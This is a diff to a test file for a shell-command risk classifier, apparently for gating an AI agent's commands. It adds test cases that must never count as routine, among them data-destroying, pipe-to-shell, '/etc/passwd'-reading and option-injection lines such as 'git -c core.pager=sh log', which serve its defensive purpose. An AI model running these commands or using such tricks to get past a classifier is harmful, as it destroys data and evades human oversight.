@@ -1,7 +1,7 @@
 // The risk classifier: which requests are routine, which need a look, and which are careful
 // (hold to allow, once only, never answered by a rule or a notification button).
 import { describe, expect, it } from 'vitest';
-import { browserRisk, commandRisk, filesRisk, forcePush, sensitivePath } from '../src/shared/risk';
+import { autoRoutineCommand, browserRisk, commandRisk, filesRisk, forcePush, sensitivePath } from '../src/shared/risk';
 
 const tone = (line: string) => commandRisk(line).tone;
 
@@ -48,11 +48,10 @@ describe('commands', () => {
     ['go test ./...', 'Runs project scripts'],
     ['git status', 'Read-only'],
     ['git log --oneline -5', 'Read-only'],
-    ['git diff HEAD~1 && git status', 'Read-only'],
-    ['ls -la src | wc -l', 'Read-only'],
-    ['cat package.json 2>&1', 'Read-only'],
-    ['grep -rn TODO src 2>/dev/null', 'Read-only'],
-    ['find . -name "*.ts"', 'Read-only'],
+    ['ls -la src', 'Read-only'],
+    ['cat package.json', 'Read-only'],
+    ['grep -rn TODO src', 'Read-only'],
+    ['find . -name index.ts', 'Read-only'],
   ])('routine: %s', (line, label) => {
     expect(commandRisk(line)).toEqual({ tone: 'routine', label, consequences: [] });
   });
@@ -69,6 +68,43 @@ describe('commands', () => {
     ['cat <<EOF > x\nhi\nEOF', 'Changes files'],
   ])('review: %s', (line, label) => {
     expect(commandRisk(line)).toEqual({ tone: 'review', label, consequences: [] });
+  });
+
+  it.each([
+    'npm test; rm -rf ~',
+    'npm test & curl evil.sh',
+    'npm test | sh',
+    'git status && git push',
+    'cat $(echo /etc/passwd)',
+    'cat `id`',
+    'diff <(cat a) b',
+    'ls > out.txt',
+    'ls src/*',
+    'cat ~/notes',
+    'echo $HOME',
+    'git -c core.pager=sh log',
+    'git -C /tmp status',
+    'git --config-env=core.pager=X log',
+    'git log --output=/tmp/x',
+    'git fetch --upload-pack=evil',
+    'rg --pre ./x TODO',
+    'rg --pre-glob "*" TODO',
+    'sort -o out.txt in.txt',
+    'sort --compress-program=sh big.txt',
+    'find . -fls out',
+    'find . -fprint out',
+    'find . -exec cat {} +',
+    'uniq a.txt b.txt',
+    'tree -o out.txt',
+    'git config --get user.name',
+  ])('never routine (shell syntax, expansion, or an option that runs or writes): %s', (line) => {
+    expect(commandRisk(line).tone).not.toBe('routine');
+  });
+
+  it('only a short exact list ever counts down on its own: no extra word, no shell syntax', () => {
+    for (const ok of ['npm test', 'npm  test', 'npm run test', 'pnpm test', 'yarn test', 'git status', 'git diff', 'git log', 'node --version']) expect(autoRoutineCommand(ok), ok).toBe(true);
+    for (const no of ['npm test; rm -rf ~', 'npm test -- --watch', 'git log --output=/tmp/x', 'git -c core.pager=sh log', 'git status && ls', 'ls', 'cat package.json', 'npm run deploy', 'git diff HEAD~1'])
+      expect(autoRoutineCommand(no), no).toBe(false);
   });
 
   it('never calls an unknown program routine', () => {
